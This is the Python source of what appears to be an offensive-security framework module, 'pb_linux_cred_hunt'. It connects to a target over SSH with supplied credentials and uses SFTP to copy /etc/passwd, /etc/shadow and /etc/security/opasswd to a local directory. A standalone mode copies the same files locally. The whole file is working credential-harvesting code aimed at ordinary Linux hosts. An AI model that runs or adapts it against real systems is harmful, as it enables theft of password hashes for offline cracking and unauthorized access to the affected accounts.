# /modules/pb_linux_cred_hunt.py
import argparse
from pathlib import Path

# remote condition
try:
    from modules.base import BaseModule
    from core.utils.ssh_handler import create_ssh_client
    from core.utils.formatter import printc

    IS_PEEKABOO = True

except ImportError:
    IS_PEEKABOO = False
    print("Running Locally ...")


TARGET_FILES = ["/etc/passwd", "/etc/shadow", "/etc/security/opasswd"]


# DEF
def fetch_and_save_file_local(src_path, dst_path):
    try:
        with open(src_path, "rb") as fsrc:
            data = fsrc.read()
        with open(dst_path, "wb") as fdst:
            fdst.write(data)
        print(f"[+] Saved: {dst_path}")
    except Exception as e:
        print(f"[!] Failed to copy {src_path}: {e}")


def fetch_and_save_file_remote(ssh, remote_path, local_path):
    try:
        sftp = ssh.open_sftp()
        with sftp.open(remote_path, "rb") as remote_file:
            data = remote_file.read()
        with open(local_path, "wb") as local_file:
            local_file.write(data)
        sftp.close()
        printc(f"[+] Saved: {local_path}", level="success")
    except Exception as e:
        printc(f"[!] Failed to fetch {remote_path}: {e}", level="error")


class Module(BaseModule):
    def __init__(self):
        super().__init__()

        self.name = "pb_linux_cred_hunt"
        self.description = (
            "Extracts key Linux credential-related files "
            "such as /etc/shadow and /etc/passwd from the target via SSH."
        )
        self.category = "recon"
        self.author = "022NN"
        self.author_email = "n0220n@proton.me"
        self.url = "https://github.com/bkili"
        self.license = ""
        self.version = "0.0.1"

        # Default options for the module
        self.default_options = {
            "rhost": "",
            "rport": "22",
            "username": "",
            "password": "",
            "output_dir": "./ch_output",
        }

        # List of options that are considered required
        # (shown in CLI with 'yes' under Required)
        self.required_options = ["rhost", "rport", "username", "password"]

        self.options = self.default_options.copy()

    def requires(self):
        return []

    def run(self, shared_data):
        host = self.options.get("rhost").strip()
        port = int(self.options.get("rport"))
        username = self.options.get("username").strip()
        password = self.options.get("password").strip()
        output_dir = Path(self.options.get("output_dir")) / host

        # Create Output File
        output_dir.mkdir(parents=True, exist_ok=True)

        try:
            printc(f"[*] Connecting to {host}:{port} ...", level="info")
            ssh = create_ssh_client(
                host=host, port=port, username=username, password=password
            )
        except Exception as e:
            printc(f"[*] SSH connection failed: {e}", level="error")
            return

        for file in TARGET_FILES:
            filename = Path(file).name
            local_path = output_dir / filename
            fetch_and_save_file_remote(ssh, file, local_path)

        ssh.close()


# Local Version
if __name__ == "__main__" and not IS_PEEKABOO:
    parser = argparse.ArgumentParser(description="Extract Linux credential files.")
    parser.add_argument("--output", default="outputs", help="Directory to save files")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    for path in TARGET_FILES:
        filename = Path(path).name
        dst_path = output_dir / filename
        fetch_and_save_file_local(path, dst_path)
